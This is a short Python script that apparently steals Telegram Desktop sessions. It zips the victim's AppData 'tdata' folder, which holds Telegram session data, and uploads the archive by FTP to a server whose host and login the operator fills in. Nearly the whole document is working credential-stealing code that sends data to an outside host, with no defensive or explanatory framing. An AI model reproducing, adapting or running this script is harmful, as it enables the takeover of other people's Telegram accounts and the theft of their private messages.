import os.path
from ftplib import FTP
from zipfile import ZipFile

# Get current user home
pathusr = os.path.expanduser('~')
# Set tdata folder location
tdata_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'
tdata_file = tdata_path + '..\\tdata.zip'

with ZipFile(tdata_file, 'w') as zipObj:
    # Iterate over all the files in directory
    for folderName, subfolders, filenames in os.walk(tdata_path):
        for filename in filenames:
            try:
                if filename is not 'user_data':
                    # create complete filepath of file in directory
                    filePath = os.path.join(folderName, filename)
                    # Add file to zip
                    zipObj.write(filePath)
            except:
                continue

# FTP module to connect server
ftp = FTP()
ftp.set_debuglevel(2)
ftp.connect('Host of your FTP', 21)
ftp.login('Login for your FTP', 'Pass for your FTP')
ftp.cwd('/folder where you want to save file on FTP server')

# Sending file on FTP server
print(ftp.dir())
fp = open(tdata_file, 'rb')
ftp.storbinary('STOR %s' % os.path.basename("tdata.zip"), fp, 1024)
fp.close()
